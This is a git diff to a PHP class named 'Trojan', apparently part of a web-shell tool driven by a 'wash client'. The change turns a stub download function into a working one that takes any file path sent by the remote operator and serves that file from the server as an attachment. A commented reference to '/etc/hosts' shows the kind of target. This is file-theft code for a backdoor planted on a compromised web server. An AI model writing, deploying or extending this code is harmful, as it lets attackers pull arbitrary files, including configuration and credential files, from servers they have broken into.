@@ -145,21 +145,13 @@ class Trojan{
     /**
      * Downloads a file
      *
-     * @param string $file             The file to download
+     * @param string $args             Arguments passed from the wash client
      */
-    public function payload_download($file = 'blah'){
-
-        # assemble a response
-        $this->response = array(
-            'output'         => 'Download was invoked',
-            'prompt_context' => 'wash.download: ',
-        );
-
-        $this->send_response();
-
-        /*
-        $file = '/etc/hosts';
-        if (file_exists($file)) {
+    public function payload_download($args){
+        $file = $args['file'];
+        
+        # if the requested file exists, serve it up to the user
+        if(file_exists($file)){
             header('Content-Description: File Transfer');
             header('Content-Type: application/octet-stream');
             header('Content-Disposition: attachment; filename='.basename($file));
@@ -168,12 +160,12 @@ class Trojan{
             header('Cache-Control: must-revalidate');
             header('Pragma: public');
             header('Content-Length: ' . filesize($file));
-            ob_clean();
-            flush();
             readfile($file);
-            die();
         }
-        */
+        
+        # if not, provide a notification
+        else { echo "The requested file does not exist."; }
+        die();
     }
 
     # fire mah layzor
